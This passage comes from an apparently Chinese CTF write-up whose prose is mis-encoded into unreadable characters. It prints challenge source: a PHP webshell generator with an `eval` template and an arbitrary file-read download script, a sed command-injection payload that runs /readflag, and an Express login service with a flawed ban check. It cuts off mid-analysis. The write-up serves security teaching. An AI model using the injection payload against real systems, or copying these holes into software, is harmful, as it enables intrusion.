class="hljs-string">&quot;text&quot;</span> value=<span class="hljs-string">&quot;webshell.php&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;ç”Ÿæˆä½ çš„ä¸“å±Webshellï¼&quot;</span>&gt;<br>    &lt;/form&gt;<br>&lt;/body&gt;<br><span class="hljs-comment">//download.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=<span class="hljs-subst">$filename</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œï¼Œæ‰§è¡Œäº†<code>shell</code>è„šæœ¬æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;METHOD=<span class="hljs-subst">$method</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ çš„methodå¤ªå¤æ‚äº†ï¼&quot;</span>);<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;KEY=<span class="hljs-subst">$key</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ çš„keyå¤ªå¤æ‚äº†ï¼&quot;</span>);<br>    <span class="hljs-variable">$status_code</span> = -<span class="hljs-number">1</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;sh generate.sh&quot;</span>);<br></code></pre></td></tr></table></figure><p>ä¸‹è½½<code>generate.sh</code>æ–‡ä»¶ï¼Œè¿™ä¸œè¥¿å¤§è‡´æ„æ€å°±æ˜¯å¯¹æ¨¡æ¿å†…å®¹è¿›è¡Œäº†æ›¿æ¢ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><br>set -e<br><br>NEW_FILENAME=$(tr -dc a-z0-9 &lt;/dev/urandom | head -c 16)<br>cp template.php &quot;/tmp/$NEW_FILENAME&quot;<br>cd /tmp<br><br>sed -i &quot;s/KEY/$KEY/g&quot; &quot;$NEW_FILENAME&quot;<br>sed -i &quot;s/METHOD/$METHOD/g&quot; &quot;$NEW_FILENAME&quot;<br><br>realpath &quot;$NEW_FILENAME&quot;<br></code></pre></td></tr></table></figure><p><code>templete.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_METHOD</span>[<span class="hljs-string">&quot;KEY&quot;</span>]);<br><br></code></pre></td></tr></table></figure><p>è¿™é¢˜çœ‹ç€<code>wp</code>åšçš„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/g;1e /readflag;s//<br>å³:<br>sed -i &quot;s/KEY//g;1e /readflag;s///g&quot; &quot;$NEW_FILENAME&quot;<br></code></pre></td></tr></table></figure><p><code>s/KEY//g</code>è¿™ä¸œè¥¿æ˜¯ä¸ªæ›¿æ¢æ“ä½œï¼Œå°†<code>$NEW_FILENAME</code>è¿™ä¸ªæ–‡ä»¶é‡Œæ‰€æœ‰çš„<code>KEY</code>éƒ½æ›¿æ¢æˆç©ºã€‚<code>;</code>ç”¨æ¥åˆ†éš”å¤šä¸ª<code>sed</code>å‘½ä»¤ã€‚<code>e</code>è¿™ä¸œè¥¿å¯ä»¥ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤(æ¯”å¦‚<code>/readflag</code>)ï¼Œå‰é¢åŠ ä¸ª<code>1</code>è¡¨ç¤ºå°†æ‰§è¡Œç»“æœæ’å…¥åˆ°æ–‡ä»¶ç¬¬ä¸€è¡Œã€‚åé¢åˆç”¨äº†ä¸€ä¸ª<code>;</code>åˆ†å‰²å¹¶å°†æ‰€æœ‰ç©ºå­—ç¬¦ä¸²æ›¿æ¢æˆç©ºå­—ç¬¦ä¸²ã€‚</p><p><code>KEY</code>å’Œ<code>METHOD</code>éƒ½å¯æ§ï¼Œéšä¾¿æ”¹ä¸€ä¸ªå°±è¡Œã€‚</p><p>æœ€åæ³¨æ„è¿™é‡Œï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;key&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;114&quot;</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;[A-Za-z0-9]+&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;ä½ çš„keyå¤ªå¤æ‚äº†ï¼ç®€å•ç‚¹ï¼o.O&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç®€å•å‰ç«¯éªŒè¯ï¼ŒæŠ“åŒ…ä¿®æ”¹å°±è¡Œã€‚</p><h3 id="Wait-What"><a href="#Wait-What" class="headerlink" title="Wait What?"></a>Wait What?</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šè¿™æ€ä¹ˆå¯èƒ½å‘¢ï¼Ÿ</p></blockquote><p><img src="/img/nctfwaitwhat1.png" alt="nctfwaitwhat1"></p><p><code>app.js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs js"><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> child_process = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>())<br><span class="hljs-keyword">const</span> port = <span class="hljs-number">80</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeRegExp</span>(<span class="hljs-params">string</span>) &#123;<br>    <span class="hljs-keyword">return</span> string.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[.*+?^$&#123;&#125;()|[\]\\]/g</span>, <span class="hljs-string">&#x27;\\$&amp;&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">let</span> users = &#123;<br>    <span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>,<br>    <span class="hljs-string">&quot;guest&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>,<br>    <span class="hljs-string">&#x27;hacker&#x27;</span>:<span class="hljs-string">&#x27;hacker&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">let</span> banned_users = [<span class="hljs-string">&#x27;hacker&#x27;</span>]<br><br><span class="hljs-comment">// ä½ ä¸å‡†getflag</span><br>banned_users.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;admin&quot;</span>) <br><br><span class="hljs-keyword">let</span> banned_users_regex = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">build_banned_users_regex</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">let</span> regex_string = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> username <span class="hljs-keyword">of</span> banned_users) &#123;<br>        regex_string += <span class="hljs-string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-string">&quot;|&quot;</span><br>    &#125;<br>    regex_string = regex_string.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, regex_string.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>)<br>    banned_users_regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(regex_string, <span class="hljs-string">&quot;g&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">//é‰´æƒä¸­é—´ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">requireLogin</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span><br>    <span class="hljs-keyword">let</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span><br>    <span class="hljs-keyword">if</span> (!username || !password) &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç”¨æˆ·åæˆ–å¯†ç ä¸èƒ½ä¸ºç©º&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> username !== <span class="hljs-string">&quot;string&quot;</span> || <span class="hljs-keyword">typeof</span> password !== <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç”¨æˆ·åæˆ–å¯†ç ä¸åˆæ³•&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-comment">// åŸºäºæ­£åˆ™æŠ€æœ¯çš„å°ç¦ç”¨æˆ·åŒ¹é…ç³»ç»Ÿçš„è®¾è®¡ä¸å®ç°</span><br>    <span class="hljs-keyword">let</span> test1 = banned_users_regex.<span class="hljs-title function_">test</span>(username)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä½¿ç”¨æ­£åˆ™<span class="hljs-subst">$&#123;banned_users_regex&#125;</span>åŒ¹é…<span class="hljs-subst">$&#123;username&#125;</span>çš„ç»“æœä¸ºï¼š<span class="hljs-subst">$&#123;test1&#125;</span>`</span>)<br>    <span class="hljs-keyword">if</span> (test1) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;ç¬¬ä¸€ä¸ªåˆ¤æ–­åŒ¹é…åˆ°å°ç¦ç”¨æˆ·ï¼š&quot;</span>,username)<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç”¨æˆ·&#x27;&quot;</span>+username + <span class="hljs-string">&quot;&#x27;è¢«å°ç¦ï¼Œæ— æ³•é‰´æƒï¼&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-comment">// åŸºäºinå…³é”®å­—çš„å°ç¦ç”¨æˆ·åŒ¹é…ç³»ç»Ÿçš„è®¾è®¡ä¸å®ç°</span><br>    <span class="hljs-keyword">let</span> test2 = (username <span class="hljs-keyword">in</span> banned_users)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä½¿ç”¨inå…³é”®å­—åŒ¹é…<span class="hljs-subst">$&#123;username&#125;</span>çš„ç»“æœä¸ºï¼š<span class="hljs-subst">$&#123;test2&#125;</span>`</span>)<br>    <span class="hljs-keyword">if</span> (test2)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;ç¬¬äºŒä¸ªåˆ¤æ–­åŒ¹é…åˆ°å°ç¦ç”¨æˆ·ï¼š&quot;</span>,username)<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç”¨æˆ·&#x27;&quot;</span>+username + <span class="hljs-string">&quot;&#x27;è¢«å°ç¦ï¼Œæ— æ³•é‰´æƒï¼&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; users[username] === password) &#123;<br>        <span class="hljs-title function_">next</span>()<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œé‰´æƒå¤±è´¥ï¼&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">registerUser</span>(<span class="hljs-params">username, password</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> username !== <span class="hljs-string">&quot;string&quot;</span> || username.<span class="hljs-property">length</span> &gt; <span class="hljs-number">20</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ç”¨æˆ·åä¸åˆæ³•&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> password !== <span class="hljs-string">&quot;string&quot;</span> || password.<span class="hljs-property">length</span> &gt; <span class="hljs-number">20</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;å¯†ç ä¸åˆæ³•&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ç”¨æˆ·å·²å­˜åœ¨&quot;</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> existing_user <span class="hljs-keyword">in</span> users)&#123;<br>        <span class="hljs-keyword">let</span> existing_user_password = users[existing_user]<br>        <span class="hljs-keyword">if</span> (existing_user_password === password)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">`æ‚¨çš„å¯†ç å·²ç»è¢«ç”¨æˆ·&#x27;<span class="hljs-subst">$&#123;existing_user&#125;</span>&#x27;ä½¿ç”¨äº†ï¼Œè¯·ä½¿ç”¨å…¶å®ƒçš„å¯†ç `</span><br>        &#125;<br>    &#125;<br><br>    users[username] = password<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æ³¨å†ŒæˆåŠŸ&quot;</span><br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;public&#x27;</span>))<br><br><span class="hljs-comment">// æ¯æ¬¡è¯·æ±‚å‰ï¼Œæ›´æ–°å°ç¦ç”¨æˆ·æ­£åˆ™ä¿¡æ¯</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-title function_">build_banned_users_regex</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;å°ç¦ç”¨æˆ·æ­£åˆ™è¡¨è¾¾å¼ï¼ˆæ»¡è¶³è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„ç”¨æˆ·åä¸ºè¢«å°ç¦ç”¨æˆ·åï¼‰ï¼š&quot;</span>,banned_users_regex)<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    &#125;<br>    <span class="hljs-title function_">next</span>()<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/register&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span><br>    <span class="hljs-keyword">let</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span><br>    <span class="hljs-keyword">let</span> message = <span class="hljs-title function_">registerUser</span>(username, password)<br>    res.<span class="hljs-title function_">send</span>(message)<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/login&quot;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç™»å½•æˆåŠŸï¼&quot;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/flag&quot;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span><br>    <span class="hljs-keyword">if</span> (username !== <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç™»å½•æˆåŠŸï¼Œä½†æ˜¯åªæœ‰&#x27;admin&#x27;ç”¨æˆ·å¯ä»¥çœ‹åˆ°flagï¼Œä½ çš„ç”¨æˆ·åæ˜¯&#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">let</span> flag = child_process.<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;cat flag&quot;</span>).<span class="hljs-title function_">toString</span>()<br>    res.<span class="hljs-title function_">end</span>(flag)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;æœ‰äººè·å–åˆ°äº†flagï¼ä¸ºäº†ä¿è¯é¢˜ç›®çš„æ­£å¸¸è¿è¡Œï¼Œå°†ä¼šé‡ç½®é¶æœºç¯å¢ƒï¼&quot;</span>)<br>    res.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;finish&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123; process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>) &#125;, <span class="hljs-number">1</span>)<br>    &#125;)<br>    <span class="hljs-keyword">return</span><br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/ban_user&#x27;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span><br>    <span class="hljs-keyword">let</span> ban_username = req.<span class="hljs-property">body</span>.<span class="hljs-property">ban_username</span><br>    <span class="hljs-keyword">if</span>(!ban_username)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ban_usernameä¸èƒ½ä¸ºç©º&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(username === ban_username)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ä¸èƒ½å°ç¦è‡ªå·±&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> name <span class="hljs-keyword">of</span> banned_users)&#123;<br>        <span class="hljs-keyword">if</span> (name === ban_username) &#123;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç”¨æˆ·å·²ç»è¢«å°ç¦&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>    &#125;<br>    banned_users.<span class="hljs-title function_">push</span>(ban_username)<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;å°ç¦æˆåŠŸï¼&quot;</span>)<br>&#125;)<br><br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/static/index.html&quot;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`listening on port <span class="hljs-subst">$&#123;port&#125;</span>`</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>ä¸€ç‚¹ä¸€ç‚¹åˆ†æï¼šé¦–å…ˆå®šä¹‰<code>users</code>å¯¹è±¡å¹¶è®¾ç½®<code>banned_users</code>æ•°ç»„ï¼Œç„¶åæŠŠ<code>admin</code>æ”¾é‡Œé¢å»ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> users = &#123;<br>    <span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>,<br>    <span class="hljs-string">&quot;guest&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>,<br>    <span class="hljs-string">&#x27;hacker&#x27;</span>:<span class="hljs-string">&#x27;hacker&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">let</span> banned_users = [<span class="hljs-string">&#x27;hacker&#x27;</span>]<br><br><span class="hljs-comment">// ä½ ä¸å‡†getflag</span><br>banned_users.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;admin&quot;</span>) <br></code></pre></td></tr></table></figure><p>åªæœ‰<code>admin</code>ç”¨æˆ·æ‰èƒ½æ‹¿<code>flag</code>ï¼Œä½†åˆšåˆš<code>admin</code>å·²ç»è¢«ä¸¢åˆ°<code>banned_users</code>é‡Œé¢äº†ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/flag&quot;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span> <span class="hljs-comment">//ä»è¯·æ±‚ä½“ä¸­è·å–ç”¨æˆ·å</span><br>    <span class="hljs-keyword">if</span> (username !== <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç™»å½•æˆåŠŸï¼Œä½†æ˜¯åªæœ‰&#x27;admin&#x27;ç”¨æˆ·å¯ä»¥çœ‹åˆ°flagï¼Œä½ çš„ç”¨æˆ·åæ˜¯&#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">let</span> flag = child_process.<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;cat flag&quot;</span>).<span class="hljs-title function_">toString</span>()<br>    res.<span class="hljs-title function_">end</span>(flag)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;æœ‰äººè·å–åˆ°äº†flagï¼ä¸ºäº†ä¿è¯é¢˜ç›®çš„æ­£å¸¸è¿è¡Œï¼Œå°†ä¼šé‡ç½®é¶æœºç¯å¢ƒï¼&quot;</span>)<br>    res.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;finish&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123; process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>) &#125;, <span class="hljs-number">1</span>)<br>    &#125;)<br>    <span class="hljs-keyword">return</span><br>&#125;)<br></code></pre></td></tr></table></figure><p><code>waf</code>ä¸­æ­£åˆ™è¡¨è¾¾å¼çš„è®¾ç½®ï¼šç®€å•è¯´å°±æ˜¯éå†<code>banned_users</code>è¿™ä¸ªæ•°ç»„ï¼Œç„¶åæ‹¼æˆç±»ä¼¼<code>^admin$|^hacker$</code>è¿™ç§å­—ç¬¦ä¸²æ”¾åˆ°æ­£åˆ™è¡¨è¾¾å¼é‡Œã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> banned_users_regex = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">build_banned_users_regex</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">let</span> regex_string = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> (<span 